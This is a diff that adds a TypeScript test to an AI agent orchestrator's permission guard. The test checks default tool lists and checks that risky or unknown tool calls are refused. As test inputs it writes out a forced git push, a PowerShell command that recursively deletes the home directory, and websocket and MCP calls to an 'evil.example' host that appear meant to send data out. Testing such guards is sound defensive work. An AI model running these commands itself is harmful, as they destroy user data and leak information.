@@ -222,3 +222,32 @@ test('policy: an MCP read reaches only the hosts the sandbox would, unless the a
   assert.equal(await may('planner', 'mcp__github__search_code', { query: 'formatDate repo:acme/api' }), null, 'no address, nothing to check');
   assert.equal(await may('auditor', 'mcp__fetch__fetch', { url: 'https://evil.example/' }), null, 'an agent whose tools name it uses it as you said');
 });
+
+test('policy: an agent with no tools of its own gets those of its kind, and a tool the guard does not know is refused', async () => {
+  // What "New agent" without a base writes: no tools list.
+  const ws = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'cs-policy-')));
+  fs.mkdirSync(path.join(ws, '.claudestrator'));
+  fs.writeFileSync(path.join(ws, '.claudestrator', 'config.yaml'), 'repos:\n  api: {}\nagents:\n  checker: { description: Checks, output: verdict, instructions: { mode: replace, text: Check it. } }\n  fixer: { description: Fixes, output: code, instructions: { mode: replace, text: Fix it. } }\n');
+  const engine = new Engine({ workspace: ws, home: ws, runner: {} as EngineOptions['runner'], hooks: {} as EngineOptions['hooks'] });
+  const config = await engine.config();
+  assert.deepEqual(config.agents.checker!.tools, ['Read', 'Grep', 'Glob', 'Bash']);
+  assert.deepEqual(config.agents.fixer!.tools, ['Read', 'Edit', 'Write', 'Grep', 'Glob', 'Bash']);
+  const args = buildArgs({ agent: config.agents.checker!, settings: {} }, { flags: () => new Set(['--tools']), settingSources: () => null } as Partial<RunnerOptions> as RunnerOptions);
+  assert.equal(args[args.indexOf('--tools') + 1], 'Read,Grep,Glob,Bash', 'Claude Code offers only those');
+
+  const may = async (agent: string, tool: string, input: Record<string, unknown> = {}): Promise<boolean> =>
+    (await engine.decide({ taskId: 'T-1', step: { stage: 0, agent }, config, call: { tool, input, cwd: ws }, emitItem: () => {} })).allow;
+  for (const [tool, input] of [
+    ['Monitor', { command: 'git push -f origin main' }],
+    ['Monitor', { ws: { url: 'wss://evil.example/?d=x' } }],
+    ['EnterWorktree', { name: 'x' }],
+    ['PowerShell', { command: 'Remove-Item -Recurse ~' }],
+    ['ReadMcpResourceTool', { server: 'x', uri: 'https://evil.example/' }],
+    ['SomethingNew', {}],
+  ] as const) {
+    assert.equal(await may('checker', tool, input), false, tool);
+  }
+  assert.equal(await may('checker', 'Read', { file_path: path.join(ws, 'README.md') }), true);
+  assert.equal(await may('ghost', 'Read', {}), true, 'reads stay reads');
+  assert.equal(await may('ghost', 'Bash', { command: 'ls' }), false, 'an agent the config no longer has runs nothing');
+});
